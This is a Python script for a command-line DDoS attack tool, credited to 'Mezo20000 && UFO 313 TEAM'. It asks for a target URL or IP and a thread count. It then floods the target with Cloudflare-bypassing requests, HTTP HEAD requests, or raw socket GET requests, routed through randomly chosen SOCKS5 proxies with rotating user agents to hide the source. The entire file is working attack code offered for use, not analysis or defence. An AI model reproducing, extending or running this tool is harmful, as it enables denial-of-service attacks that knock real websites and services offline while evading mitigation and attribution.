import socket
import os
import sys
import requests
import cfscrape
from threading import Thread
import random
import httpx
import asyncio
import socks
user=open("user-agents.txt","r").read().splitlines()
proxy=open("proxy.txt","r").read().splitlines()
os.system("clear")
print('''


Coded By Mezo20000☠ && UFO 313 TEAM
''')
while True:
	cmd=input("======>#")
	if cmd=="help":
		print('''
		+---------------------------+
		|         methods           |
		|   {help,cf,HTTP,socks}    |
		+---------------------------+	
		''')
	elif cmd=="cf":
		 global host
		 #global num
		 os.system("clear") 
		 print('''
		 
		hi
		 
		 ''')
		 host=input("Url For Attack:")
		 num=int(input("Enter thread:"))
		 break
	elif cmd=="HTTP":
		global host2
		global num2
		os.system("clear")
		print('''
		
	hiii
		
		''')
		host2=input("Url For Attack:")
		num2=int(input("Enter thread:"))
		break
	elif cmd=="socks":
		global host3
		global num3
		global port
		os.system("clear")
		print('''
hey

		''')
		host3=input("IP For Attack:")
		port=int(input("Port for Attack :"))
		num3=int(input("Enter thread:"))
		
		break
	else:
		print("enter help to show methods!!")
def ddos(num):
	try:
		proxy2={
			"all://":"socks5://"+str(random.choice(proxy))
			#"https":"socks5://"+str(random.choice(proxy))

		}
		u=random.choice(user)
		sc = cfscrape.CloudflareScraper()
		cf=sc.get(host,headers={'User-Agent':u}, proxies=proxy2)
		print("[+]--Send Packet FROME "+random.choice(proxy)+" TO "+host+":"+str(cf.status_code))
		return True
	except:
		print("connect error!!")

def http(nurt):
	try:
		proxy3={
			"all://":"socks5://"+str(random.choice(proxy))
			#"https":"socks5://"+str(random.choice(proxy))
			
			}
		with httpx.Client(proxies=proxy3) as client:
			r =client.head(host2,headers={'User-Agent':random.choice(user)})
			print("[+]--Send Packet OF the response:"+str(r.status_code))
	except:
		print("connect time out!!")
def sock3(xl):
	#proxy_ip="109.197.55.234"
	#proxy_port=1080
	#proxy_type = socks.SOCKS4
	for n3 in range(0,num3):
		sock = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
		#sock.set_proxy(proxy_type, proxy_ip, proxy_port)
		sock.connect((host3,port))
		ag1=random.choice(user)
		data=f"GET / HTTP/1.1\r\nHost:"+host3+"\r\nUser-Agent:"+ ag1+"\r\n\r\n"
		sock.send(data.encode())
		print("[+]Send Packet with IP:"+"test"+"to the Target:"+host3)
#if cmd=="cf":
	#threads = []
	#for si in range(0,num):
	#	t1=Thread(target=ddos, args=(si,))
	#	t1.start()
	#	threads.append(t1)
	#	for t1 in threads:
	#		t1.join()	
if cmd=="HTTP":
	for z in range(0,num2):
		new_thread2 = Thread(target=http,args=(10,))
		new_thread2.start()
elif cmd=="socks":
	new_thread3 = Thread(target=sock3,args=(10,))
	new_thread3.start()
else:
	print("Methods Not Founds")


threads = []
for si in range(0,num):
	t1=Thread(target=ddos, args=(si,))
	t1.start()
	threads.append(t1)
for t1 in threads:
	t1.join()	
